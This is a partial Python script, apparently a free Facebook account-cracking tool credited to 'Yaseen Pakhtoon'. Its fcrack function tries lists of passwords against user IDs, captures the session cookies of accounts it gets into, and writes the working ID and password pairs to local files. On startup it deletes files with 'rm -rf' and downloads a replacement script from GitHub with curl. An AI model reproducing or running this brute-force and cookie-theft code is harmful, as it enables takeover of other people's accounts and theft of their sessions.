...
logo = """
 ...
 |_|/_/ \_\_|\_\_||_| |_| \___/ \___/|_|\_|
        ...
        \033[1;32m 
--------------------------------------------------
[•]\033[1;32mCREATED BY     : \033[1;32Yaseen Pakhtoon\033[1;32m
[•]\033[1;32mFACEBOOK       : \033[1;32Yaseen Pakhtoon\033[1;32m
[•]\033[1;32mYOUTUBE        : \033[1;32mYaseen TRICKS\033[1;32m
[•]\033[1;32mSTATUS         : \033[1;32mFREE\033[1;32m
--------------------------------------------------
[•] \033[1;37mVERSION    :\033[1;32m 26.0 \033[1;33m"DON'T WORRY FOR UPDATES!"\033[1;33m 1.3
--------------------------------------------------"""
...
try:
    ...
    proxy = requests.get('https://raw.githubusercontent.com/Alam-Khattak/Yaseen/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/Khattak-Yaseen/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/Khattak-Aam/Yaseen/main/ali.py > ali.py')
...
def fcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'user-agent': 'Mozilla/5.0 (Linux; Android 9; TVBOX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5633.213 Mobile Safari/537.36',}
           ...
           #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[Pathan-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m')
                open('Pathan-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[Pthani-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('pathani-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mPathan\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
